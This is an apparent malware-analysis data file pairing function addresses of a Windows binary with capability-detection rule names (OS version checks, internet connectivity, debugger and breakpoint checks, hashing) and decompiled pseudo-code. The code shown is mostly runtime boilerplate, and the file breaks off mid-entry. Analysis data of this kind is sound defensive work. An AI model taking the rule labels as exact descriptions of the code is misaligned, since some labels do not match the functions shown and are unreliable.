{
    "00405dca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405dca(uint *param_1)\n\n{\n    *param_1 = 0x4015e8;\n    if (param_1[2] != 0) {\n        fcn.00406adf(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00404736": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404736(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint var_ch;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    else if (0xffffffff / arg_8h == 0) {\n        fcn.004033e0(0);\n        fcn.00405f9b(&var_ch, 0x411c48);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.00405f36(arg_8h);\n    return;\n}\n",
        "token_count": 140
    },
    "00404ace": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404ace(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.004045ea();\n    if ((iVar1 != 0) && (uVar2 = fcn.004045ea(),  *(in_ECX + 0x3c) < uVar2)) {\n        uVar3 = fcn.004045ea();\n        *(in_ECX + 0x3c) = uVar3;\n    }\n    if (((arg_14h & 1) == 0) || (iVar4 = fcn.004045e4(),  iVar1 = *0x401594,  iVar4 == 0)) {\n        iVar1 = *0x401594;\n        if (((arg_14h & 2) != 0) && (iVar4 = fcn.004045ea(),  iVar1 = *0x401594,  iVar4 != 0)) {\n            if (arg_10h == 2) {\n                iVar4 = fcn.004045de();\n                arg_ch = arg_ch + (*(in_ECX + 0x3c) - iVar4);\n            }\n            else if (arg_10h == 1) {\n                iVar4 = fcn.004045ea();\n                iVar5 = fcn.004045de();\n                arg_ch = arg_ch + (iVar4 - iVar5);\n            }\n            else if (arg_10h != 0) {\n                arg_ch = *0x401594;\n            }\n            if ((-1 < arg_ch) && (iVar4 = fcn.004045de(),  arg_ch <= *(in_ECX + 0x3c) - iVar4)) {\n                iVar1 = fcn.004045ea();\n                iVar4 = fcn.004045de();\n                fcn.00404869((arg_ch - iVar1) + iVar4);\n                iVar1 = arg_ch;\n            }\n        }\n        goto code_r0x00404c66;\n    }\n    if (arg_10h == 2) {\n        iVar4 = fcn.004045de();\n        arg_ch = arg_ch + (*(in_ECX + 0x3c) - iVar4);\n    }\n    else if (arg_10h == 1) {\n        if ((arg_14h & 2) == 0) {\n            iVar4 = fcn.004045e4();\n            iVar5 = fcn.004045de();\n            arg_ch = arg_ch + (iVar4 - iVar5);\n        }\n        else {\ncode_r0x00404b54:\n            arg_ch = *0x401594;\n        }\n    }\n    else if (arg_10h != 0) goto code_r0x00404b54;\n    if ((-1 < arg_ch) && (iVar4 = fcn.004045de(),  arg_ch <= *(in_ECX + 0x3c) - iVar4)) {\n        iVar1 = fcn.004045e4();\n        iVar4 = fcn.004045de();\n        fcn.00404839((arg_ch - iVar1) + iVar4);\n        iVar1 = arg_ch;\n        if (((arg_14h & 2) != 0) && (iVar4 = fcn.004045ea(),  iVar4 != 0)) {\n            uVar3 = fcn.0040461b();\n            uVar3 = fcn.004045e4(uVar3);\n            uVar3 = fcn.00404952(uVar3);\n            fcn.00404642(uVar3);\n        }\n    }\ncode_r0x00404c66:\n    fcn.00404889(iVar1);\n    return arg_8h;\n}\n",
        "token_count": 868
    },
    "00404fc3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404fc3(uint32_t arg_8h)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    int32_t in_ECX;\n    bool bVar10;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if (((*(in_ECX + 0x40) & 8) != 0) && (iVar3 = fcn.004045ea(),  iVar3 != 0)) {\n        uVar6 = *(in_ECX + 0x3c);\n        uVar4 = fcn.004045ea();\n        if (uVar4 < uVar6) {\n            uVar5 = fcn.0040461b();\n            uVar5 = fcn.00404952(uVar6, uVar5);\n            fcn.00404642(uVar5);\n        }\n    }\n    uVar6 = fcn.0040480b();\n    var_ch = uVar6;\n    cVar1 = fcn.004047f9(&var_ch, &arg_8h);\n    if (cVar1 != '\\0') {\n        uVar6 = fcn.00404939(&arg_8h);\n        return uVar6;\n    }\n    iVar3 = fcn.004045ea();\n    if (iVar3 != 0) {\n        uVar4 = fcn.0040461b();\n        uVar7 = fcn.004045ea();\n        if (uVar7 < uVar4) goto code_r0x00405174;\n    }\n    if ((*(in_ECX + 0x40) & 2) != 0) {\n        return uVar6;\n    }\n    iVar3 = fcn.004045ea();\n    if (iVar3 == 0) {\n        var_4h = 0;\n    }\n    else {\n        iVar3 = fcn.0040461b();\n        iVar8 = fcn.004045de();\n        var_4h = iVar3 - iVar8;\n    }\n    uVar6 = var_4h;\n    var_ch = 0x20;\n    if (0x1f < var_4h >> 1) {\n        var_ch = var_4h >> 1;\n    }\n    iVar3 = 0;\n    var_8h = fcn.004045de();\n    uVar4 = var_ch;\n    if (var_ch != 0) {\n        do {\n            if (var_4h <= 0x7fffffff - uVar4) break;\n            uVar4 = uVar4 >> 1;\n        } while (uVar4 != 0);\n        if (uVar4 != 0) {\n            uVar6 = uVar4 + var_4h;\n            iVar3 = fcn.00404dc5(uVar6);\n        }\n    }\n    bVar10 = var_4h == 0;\n    if (!bVar10) {\n        fcn.00404e53(iVar3, uVar6, var_8h, var_4h);\n        bVar10 = var_4h == 0;\n    }\n    if (bVar10) {\n        *(in_ECX + 0x3c) = iVar3;\n        fcn.00404626(iVar3, iVar3 + uVar6);\n    }\n    else {\n        *(in_ECX + 0x3c) = *(in_ECX + 0x3c) + (iVar3 - var_8h);\n        var_ch = iVar3 - var_8h;\n        iVar8 = fcn.004045ea(iVar3 + uVar6);\n        iVar8 = fcn.00404952(iVar8 + var_ch);\n        fcn.00404642(iVar8 + var_ch);\n        if ((*(in_ECX + 0x40) & 4) == 0) {\n            iVar8 = fcn.004045ea();\n            fcn.004045e4(iVar8 + 1);\n        }\n    }\n    fcn.004045fb(iVar3);\n    if ((*(in_ECX + 0x40) & 1) != 0) {\n        fcn.004045d1(var_8h, var_4h);\n    }\n    *(in_ECX + 0x40) = *(in_ECX + 0x40) | 1;\ncode_r0x00405174:\n    puVar9 = fcn.00404958();\n    uVar2 = fcn.004047ea(&arg_8h);\n    *puVar9 = uVar2;\n    return arg_8h;\n}\n",
        "token_count": 1070
    },
    "00405193": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00405193(int32_t param_1, char param_2, int32_t param_3)\n\n{\n    uint arg_10h;\n    uint in_stack_fffffff0;\n    \n    if ((param_2 != '\\0') && (7 < *(param_1 + 0x18))) {\n        arg_10h = *(param_1 + 4);\n        if (param_3 != 0) {\n            in_stack_fffffff0 = arg_10h;\n            fcn.00404e77(param_1 + 4, 8, arg_10h, param_3);\n        }\n        fcn.004045d1(arg_10h, *(param_1 + 0x18) + 1);\n    }\n    *(param_1 + 0x18) = 7;\n    fcn.00404e2b(in_stack_fffffff0);\n    return;\n}\n",
        "token_count": 201
    },
    "004060dd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004060dd(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x406188;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.004061b4;\n        uStack36 = *0xa8f5bc ^ &fcn.004060dd::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.004060dd::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.00408724();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.004060dd::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 718
    },
    "00406b6d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406b6d(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0xa8f5bc) {\n        return;\n    }\n    *0xaaa2e8 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0xaaa2ec = &arg_8h;\n    *0xaaa228 = 0x10001;\n    *0xaaa1d0 = 0xc0000409;\n    *0xaaa1d4 = 1;\n    var_328h = *0xa8f5bc;\n    var_324h = *0xa8f5c0;\n    *0xaaa1dc = unaff_retaddr;\n    *0xaaa2b4 = in_GS;\n    *0xaaa2b8 = in_FS;\n    *0xaaa2bc = in_ES;\n    *0xaaa2c0 = in_DS;\n    *0xaaa2c4 = unaff_EDI;\n    *0xaaa2c8 = unaff_ESI;\n    *0xaaa2cc = unaff_EBX;\n    *0xaaa2d0 = in_EDX;\n    *0xaaa2d4 = in_ECX;\n    *0xaaa2d8 = in_EAX;\n    *0xaaa2dc = unaff_EBP;\n    *0xaaa2e0 = unaff_retaddr;\n    *0xaaa2e4 = in_CS;\n    *0xaaa2f0 = in_SS;\n    *0xaaa220 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040d442(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x401e1c);\n    if (*0xaaa220 == 0) {\n        fcn.0040d442(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 843
    },
    "00407962": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00407962(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00408724();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00408724();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "00407c2a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407c2a(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.0040631b(*(unaff_EBP + -0x28));\n    iVar1 = fcn.00408724();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.00408724();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.004062f4(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.004079c2(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "0040a253": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0040a346: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0040a34b)\n// WARNING: Removing unreachable block (ram,0x0040a379)\n// WARNING: Removing unreachable block (ram,0x0040a351)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040a253(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00408ff0(0x412270, 0x18);\n    fcn.0040b6c3(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0xaa9b34 != 1) {\n        *0xaa9b30 = 1;\n        *0xaa9b2c = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.004084d8(*0xaaa7a8);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.004084d8(*0xaaa7a4);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.004084cf();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.004084d8(*piVar2);\n                        iVar3 = fcn.004084cf();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.004084d8(*0xaaa7a8);\n                        piVar1 = fcn.004084d8(*0xaaa7a4);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.0040a18d(0x4011f0);\n        }\n        fcn.0040a18d(0x4011f8);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040b5e9(8);\n    }\n    return;\n}\n",
        "token_count": 809
    },
    "0040b50b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040b50b(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040b5e9(0);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "0040e722": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040e722(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.004084cf();\n    var_4h = 0;\n    if (*0xaaa58c == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x402f38);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x402f2c);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0xaaa58c = fcn.0040845d(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x402f1c);\n        *0xaaa590 = fcn.0040845d(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x402f08);\n        *0xaaa594 = fcn.0040845d(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x402eec);\n        *0xaaa59c = fcn.0040845d(uVar3);\n        if (*0xaaa59c != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x402ed4);\n            *0xaaa598 = fcn.0040845d(uVar3);\n        }\n    }\n    if ((*0xaaa598 != iVar1) && (*0xaaa59c != iVar1)) {\n        pcVar4 = fcn.004084d8(*0xaaa598);\n        pcVar5 = fcn.004084d8(*0xaaa59c);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040e864;\n        }\n    }\n    if ((((*0xaaa590 != iVar1) && (pcVar4 = fcn.004084d8(*0xaaa590),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0xaaa594 != iVar1 && (pcVar4 = fcn.004084d8(*0xaaa594),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040e864:\n    pcVar4 = fcn.004084d8(*0xaaa58c);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 820
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00404665": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404665(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if ((*(param_1 + 0x40) & 1) != 0) {\n        iVar1 = fcn.004045ea();\n        if (iVar1 == 0) {\n            iVar1 = fcn.004045f0();\n        }\n        else {\n            iVar1 = fcn.0040461b();\n        }\n        iVar2 = fcn.004045de();\n        uVar3 = fcn.004045de(iVar1 - iVar2);\n        fcn.004045d1(uVar3);\n    }\n    fcn.004045fb(0, 0, 0);\n    fcn.00404626(0, 0);\n    *(param_1 + 0x40) = *(param_1 + 0x40) & 0xfffffffe;\n    *(param_1 + 0x3c) = 0;\n    return;\n}\n",
        "token_count": 233
    },
    "004046c1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.004046c1(uint8_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if ((param_1 & 1) == 0) {\n        uVar1 = 4;\n    }\n    if ((param_1 & 2) == 0) {\n        uVar1 = uVar1 | 2;\n    }\n    if ((param_1 & 8) != 0) {\n        uVar1 = uVar1 | 8;\n    }\n    if ((param_1 & 4) != 0) {\n        uVar1 = uVar1 | 0x10;\n    }\n    return uVar1;\n}\n",
        "token_count": 157
    },
    "00404c79": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00404c79(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint32_t arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.00404968();\n    iVar2 = fcn.004045ea();\n    if ((iVar2 != 0) && (uVar3 = fcn.004045ea(),  *(in_ECX + 0x3c) < uVar3)) {\n        uVar4 = fcn.004045ea();\n        *(in_ECX + 0x3c) = uVar4;\n    }\n    iVar2 = iVar1;\n    if (iVar1 != *0x401594) {\n        iVar2 = *0x401594;\n        if (((arg_24h & 1) == 0) || (iVar5 = fcn.004045e4(),  iVar5 == 0)) {\n            if (((arg_24h & 2) != 0) &&\n               (((iVar5 = fcn.004045ea(),  iVar5 != 0 && (-1 < iVar1)) &&\n                (iVar5 = fcn.004045de(),  iVar1 <= *(in_ECX + 0x3c) - iVar5)))) {\n                iVar2 = fcn.004045ea();\n                iVar5 = fcn.004045de();\n                fcn.00404869((iVar1 - iVar2) + iVar5);\n                iVar2 = iVar1;\n            }\n        }\n        else if ((-1 < iVar1) && (iVar5 = fcn.004045de(),  iVar1 <= *(in_ECX + 0x3c) - iVar5)) {\n            iVar2 = fcn.004045e4();\n            iVar5 = fcn.004045de();\n            fcn.00404839((iVar1 - iVar2) + iVar5);\n            iVar2 = iVar1;\n            if (((arg_24h & 2) != 0) && (iVar5 = fcn.004045ea(),  iVar5 != 0)) {\n                uVar4 = fcn.0040461b();\n                uVar4 = fcn.004045e4(uVar4);\n                uVar4 = fcn.00404952(uVar4);\n                fcn.00404642(uVar4);\n            }\n        }\n    }\n    fcn.00404889(iVar2);\n    return arg_8h;\n}\n",
        "token_count": 595
    },
    "00405394": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405394(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x401580;\n    if ((arg_8h & 1) != 0) {\n        fcn.00405e5f();\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "00405b1e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b1e(uint32_t arg_8h)\n\n{\n    fcn.00405aff();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405e5f();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00405b67": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b67(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4015a8;\n    fcn.00405aff();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405e5f();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00405bb6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405bb6(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4015b4;\n    fcn.00405aff();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405e5f();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00405ded": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ded(uint32_t arg_8h)\n\n{\n    fcn.00405dca();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405e5f();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00405e1e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405e1e(uint32_t arg_8h)\n\n{\n    fcn.00405e0e();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405e5f();\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "004077cd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004077cd(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x4016bc;\n    fcn.00405dca();\n    if ((arg_8h & 1) != 0) {\n        fcn.00405e5f();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "0040de8a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
